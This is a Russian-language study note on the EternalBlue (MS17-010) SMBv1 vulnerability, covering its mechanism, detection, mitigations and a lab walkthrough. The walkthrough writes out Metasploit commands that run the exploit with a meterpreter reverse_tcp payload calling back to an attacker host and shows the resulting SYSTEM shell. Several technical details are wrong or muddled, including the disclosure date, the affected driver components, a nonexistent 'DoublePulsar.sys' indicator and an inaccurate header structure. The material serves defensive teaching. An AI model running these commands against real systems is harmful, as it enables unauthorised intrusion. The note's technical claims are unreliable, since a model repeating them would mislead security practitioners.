# Эксплуатация уязвимости MS17-010 (EternalBlue) в протоколе SMBv1

## Контекст и базовые понятия

Уязвимость MS17-010, известная как EternalBlue, представляет собой критическую уязвимость удаленного выполнения кода (RCE) в реализации протокола Server Message Block (SMBv1) в операционных системах семейства Microsoft Windows. Данная уязвимость была раскрыта в августе 2017 года группой The Shadow Brokers, похитившей инструменты разведки АНБ США. Эксплуатация MS17-010 стала одной из самых разрушительных кампаний в истории кибербезопасности, послужив основой для распространения червей WannaCry и NotPetya, которые затронули сотни тысяч систем по всему миру.

С технической точки зрения, уязвимость заключается в ошибке обработки специальных пакетов в компоненте `srv2.sys` (в Windows 7/2008 R2) или `srvnet.sys` (в более ранних версиях, таких как Windows XP/2003), отвечающем за обработку SMB-сообщений. Ошибка возникает на этапе обработки запроса на создание контекста (SMB2 CREATE context) или, в более ранних реализациях, при обработке запроса на выполнение операции `TRANS2_FIND_FIRST2` или `TRANS2_FIND_NEXT2`. Злоумышленник может отправить специально сформированный пакет, который приводит к переполнению буфера в ядре (kernel-mode buffer overflow), позволяя внедрить и выполнить произвольный код с привилегиями SYSTEM.

Важно разграничивать понятия SMBv1, SMBv2 и SMBv3. SMBv1 — это устаревший протокол, использующий фиксированные структуры сообщений и уязвимый к данной атаке. SMBv2 и SMBv3 были разработаны для повышения производительности и безопасности, внедрив динамическое выделение памяти, шифрование и улучшенную обработку ошибок. Однако, несмотря на то что EternalBlue изначально эксплуатировал уязвимость в SMBv1, последующие исследования показали, что некоторые реализации SMBv2/v3 также содержали уязвимости (например, MS17-010 affects SMBv1, но CVE-2020-0796, "SMBGhost", затрагивает SMBv3.1.1). В контексте данного конспекта фокус делается на классической эксплуатации MS17-010 через SMBv1.

Ключевые термины:
*   **SMB (Server Message Block):** Протокол сетевого файлообмена, используемый для предоставления общего доступа к файлам, принтерам и последовательным портам между узлами.
*   **Kernel-mode RCE:** Удаленное выполнение кода в режиме ядра, что дает атакующему полный контроль над системой.
*   **DoublePulsar:** Зловредный драйвер ядра, часто устанавливаемый вместе с эксплойтом EternalBlue для обеспечения постоянного доступа (backdoor) и выполнения команд.
*   **Shadow Brokers:** Хакерская группа, опубликовавшая инструменты эксплуатации, включая EternalBlue.

Для понимания масштаба проблемы необходимо рассмотреть архитектуру SMB. Протокол работает поверх TCP (порт 445) или NetBIOS (порты 137-139). В современных системах порт 445 используется напрямую. Уязвимость находится в слое ядра, что делает ее особенно опасной, так как антивирусное ПО, работающее в режиме пользователя, не может предотвратить выполнение кода в ядре до его исполнения.

| Характеристика | SMBv1 (Уязвимый) | SMBv2/v3 (Защищенный) |
| :--- | :--- | :--- |
| **Версия протокола** | 1.0 | 2.02, 2.1, 3.0, 3.02, 3.1.1 |
| **Обработка памяти** | Фиксированные буферы, высокая вероятность переполнения | Динамическое выделение, проверка границ |
| **Шифрование** | Отсутствует (по умолчанию) | Поддерживается (AES-128/256 GCM) |
| **Статус поддержки** | Отключен по умолчанию в Windows 10/11 | Активен и рекомендуется |
| **Уязвимость MS17-010** | Да (в компонентах `srv.sys`/`srv2.sys`) | Нет (но есть другие уязвимости, напр. SMBGhost) |
| **Порт по умолчанию** | TCP 445 (или NetBIOS 137-139) | TCP 445 |

Эксплуатация EternalBlue требует наличия доступа к сети к целевой машине. Атака не требует аутентификации, что позволяет атаковать неаутентифицированных пользователей. Это отличает ее от многих других атак, требующих кражи учетных данных.

## Внутреннее устройство уязвимости и механизма атаки

Уязвимость MS17-010 кроется в неправильной обработке структуры `SMB_HEADER` и последующих данных в пакете SMB. В частности, ошибка возникает при обработке запроса на выполнение операции `TRANS2_FIND_FIRST2` или `TRANS2_FIND_NEXT2`. Эти операции используются для поиска файлов на удаленном сервере.

### Структура пакета SMB и уязвимый участок

Пакет SMB состоит из заголовка `SMB_HEADER`, заголовка `SMB_COM_TRANSACTION2` и параметров/данных. Уязвимость связана с тем, как сервер обрабатывает поле `TotalParameterCount` и `TotalDataCount` в заголовке транзакции.

В уязвимой реализации сервер выделяет буфер для данных на основе значений, переданных клиентом, но не проверяет корректность этих значений перед копированием данных в буфер. Если атакующий передает значения, превышающие размер выделенного буфера, происходит переполнение буфера в ядре.

Рассмотрим структуру заголовка SMBv1:

```text
// Структура SMB_HEADER (упрощенно)
struct SMB_HEADER {
    uint32_t Protocol;          // 0xFF534D42 ("SMB")
    uint8_t  Command;           // Команда (например, SMB_COM_TRANSACTION2 = 0x33)
    uint16_t ErrorClass;        // Класс ошибки
    uint16_t Reserved;
    uint32_t Error;             // Код ошибки
    uint16_t Flags;
    uint16_t Flags2;
    uint16_t PIDHigh;
    uint16_t SecurityFeatures;
    uint16_t Reserved2;
    uint16_t TID;
    uint16_t PIDLow;
    uint16_t UID;
    uint16_t MID;
};

// Структура SMB_COM_TRANSACTION2 (упрощенно)
struct SMB_COM_TRANSACTION2 {
    uint16_t TotalParameterCount;
    uint16_t TotalDataCount;
    uint16_t MaxParameterCount;
    uint16_t MaxDataCount;
    uint8_t  MaxSetupCount;
    uint8_t  Reserved;
    uint16_t Flags;
    uint32_t Timeout;
    uint16_t Reserved2;
    uint16_t ParameterCount;
    uint16_t ParameterOffset;
    uint16_t DataCount;
    uint16_t DataOffset;
    uint8_t  SetupCount;
    uint8_t  Reserved3;
    uint16_t Reserved4;
    uint16_t ParameterDisp;
    uint16_t DataDisp;
};
```

Атакующий формирует пакет, в котором `TotalParameterCount` и `TotalDataCount` установлены в значения, значительно превышающие фактический размер данных. Сервер, пытаясь обработать этот запрос, выделяет буфер в ядре, но из-за ошибки в логике проверки границ (boundary check) происходит запись за пределами выделенной памяти.

### Механизм переполнения буфера

В уязвимой версии Windows (например, Windows 7 SP1) компонент `srv.sys` обрабатывает запрос `SMB_COM_TRANSACTION2`. При обработке данных сервер использует функцию `SrvAllocateNonPagedPool` для выделения памяти. Однако, перед выделением памяти, сервер не проверяет, что `TotalDataCount` не превышает максимальный размер пакета.

Когда данные поступают, сервер копирует их в выделенный буфер. Если размер данных больше размера буфера, происходит переполнение. Атакующий контролирует содержимое данных, что позволяет ему перезаписать критические структуры данных в ядре, такие как указатели функций или адреса возврата.

### Этапы эксплуатации

1.  **Инициализация соединения:** Атакующий устанавливает TCP-соединение с портом 445 целевой машины.
2.  **Negotiate Protocol:** Клиент и сервер обмениваются пакетами `SMB_COM_NEGOTIATE` для согласования версии протокола. Атакующий выбирает SMBv1.
3.  **Session Setup:** Клиент отправляет `SMB_COM_SESSION_SETUP_ANDX`. Поскольку атака не требует аутентификации, атакующий может использовать пустые учетные данные.
4.  **Tree Connect:** Клиент подключается к общему ресурсу (например, `IPC$`).
5.  **Эксплуатация:** Атакующий отправляет специально сформированный пакет `SMB_COM_TRANSACTION2` с переполненным буфером.
6.  **Код выполнения:** После переполнения буфера атакующий контролирует поток выполнения ядра. Обычно внедряется shellcode, который отключает защиту (например, DEP) и загружает драйвер DoublePulsar.

### Индикаторы компрометации (IoC)

*   Наличие драйвера `DoublePulsar.sys` в системе.
*   Необычная активность в порту 445.
*   Наличие записей в журнале событий Windows с кодом события, указывающим на переполнение буфера.
*   Наличие ключа реестра, созданного DoublePulsar для обеспечения постоянного доступа.

## Применение и работа с уязвимостью в аудите

В контексте тестирования на проникновение и аудита безопасности, знание механизма эксплуатации MS17-010 необходимо для оценки рисков и проверки эффективности защитных мер. Важно подчеркнуть, что использование эксплойтов в реальных условиях без явного разрешения владельца системы является незаконным. Аудиторы используют инструменты для обнаружения уязвимости, а не для ее эксплуатации.

### Инструменты обнаружения и проверки

Для проверки наличия уязвимости используются специализированные сканеры уязвимостей, такие как Nessus, OpenVAS или Metasploit Framework. Metasploit содержит модуль `auxiliary/scanner/smb/smb_ms17_010`, который проверяет наличие уязвимости без ее эксплуатации.

Пример использования Metasploit для проверки:

```bash
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(smb_ms17_010) > set RHOSTS 192.168.1.100
msf6 auxiliary(smb_ms17_010) > run

[+] 192.168.1.100:445    - Host is likely VULNERABLE to MS17-010!
[-] 192.168.1.101:445    - Host is not vulnerable.
```

### Правила детекции в SIEM

Для обнаружения попыток эксплуатации MS17-010 в системах мониторинга (SIEM) используются правила, основанные на анализе логов Windows и сетевого трафика.

Пример правила Sigma для обнаружения попытки эксплуатации:

```yaml
title: Potential MS17-010 Exploitation Attempt
id: 12345678-1234-1234-1234-123456789012
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\msfconsole.exe'
            - '\metasploit.exe'
        CommandLine|contains:
            - 'exploit/windows/smb/ms17_010_eternalblue'
    condition: selection
falsepositives:
    - Legitimate penetration testing
level: high
```

### Меры защиты и компенсации

1.  **Отключение SMBv1:** Это наиболее эффективная мера. В Windows 10 и выше SMBv1 отключен по умолчанию. Для старых систем необходимо вручную отключить его через "Включение или отключение компонентов Windows".
2.  **Установка патчей:** Microsoft выпустила патч KB4013389 для всех поддерживаемых версий Windows.
3.  **Брандмауэр:** Блокировка входящих соединений на порт 445 из недоверенных сетей.
4.  **Сегментация сети:** Разделение критических систем в изолированные сегменты.

### Типичные ошибки при защите

*   Игнорирование устаревших систем, которые не могут быть обновлены.
*   Неправильная конфигурация брандмауэра, позволяющая доступ к SMB из интернета.
*   Отсутствие мониторинга попыток эксплуатации.

## Сквозной практический пример: Имитация аудита уязвимости MS17-010

**Исходные условия:**
*   **Среда:** Виртуальная машина с Windows 7 SP1 (без патчей) в изолированной сети.
*   **Атакующий:** Kali Linux с установленным Metasploit Framework.
*   **Цель:** IP-адрес 192.168.1.100.
*   **Роль:** Аудитор безопасности, проводящий тестирование на проникновение с разрешения владельца.

**Шаг 1: Сканирование портов и определение службы**

Первым шагом является подтверждение того, что целевая машина открыла порт 445 и использует SMBv1.

```bash
# Использование nmap для сканирования портов
nmap -p 445 --script smb-os-discovery 192.168.1.100

# Ожидаемый вывод (фрагмент):
# PORT    STATE SERVICE
# 445/tcp open  microsoft-ds
# Host script results:
# | smb-os-discovery:
# |   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
# |   OS CPE: cpe:/o:microsoft:windows_7::-
# |   Computer name: WIN7-TEST
# |   NetBIOS computer name: WIN7-TEST\x00
# |   Workgroup: WORKGROUP\x00
# |_  System time: 2023-10-27T10:00:00+03:00
```

**Шаг 2: Проверка наличия уязвимости**

Использование модуля Metasploit для проверки уязвимости без ее эксплуатации.

```bash
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(smb_ms17_010) > set RHOSTS 192.168.1.100
msf6 auxiliary(smb_ms17_010) > run

# Ожидаемый вывод:
# [+] 192.168.1.100:445    - Host is likely VULNERABLE to MS17-010!
# [*] Scanned 1 of 1 hosts (100% complete)
# [*] Auxiliary module execution completed
```

**Шаг 3: Подготовка эксплойта (в образовательных целях, в изолированной среде)**

Если уязвимость подтверждена, аудитор может подготовить эксплойт для демонстрации последствий. В реальном аудите этот шаг обычно не выполняется, если нет явного разрешения на эксплуатацию.

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

**Шаг 4: Анализ результатов**

После успешной эксплуатации (в изолированной среде) аудитор получает доступ к системе. Важно зафиксировать изменения в системе.

```bash
# В сессии Meterpreter
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Computer: WIN7-TEST
OS: Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture: x64
```

**Ожидаемый вывод:**
Пример демонстрирует, как уязвимость MS17-010 позволяет атакующему получить полный контроль над системой без аутентификации. Это подчеркивает критическую важность установки патчей и отключения SMBv1. В реальном аудите после обнаружения уязвимости необходимо немедленно уведомить владельца системы и рекомендовать установку патча.

## Аналитический вывод

Уязвимость MS17-010 (EternalBlue) является одним из самых значимых инцидентов в области кибербезопасности, продемонстрировавшим последствия использования устаревших протоколов и недостатков в обработке памяти на уровне ядра. Эксплуатация уязвимости возможна благодаря ошибке в обработке пакетов SMBv1, что позволяет атакующему выполнить произвольный код с привилегиями SYSTEM. Несмотря на то, что уязвимость была закрыта более семи лет назад, она продолжает представлять угрозу для систем, которые не были обновлены или на которых не был отключен SMBv1.

Для специалистов по информационной безопасности критически важно понимать механизм эксплуатации уязвимостей, чтобы эффективно разрабатывать правила детекции и меры защиты. Отключение SMBv1, установка патчей и сегментация сети являются основными мерами защиты. Использование инструментов сканирования уязвимостей позволяет своевременно выявлять такие проблемы. Эксплуатация уязвимостей должна проводиться только в рамках авторизованного тестирования на проникновение с целью улучшения безопасности систем.
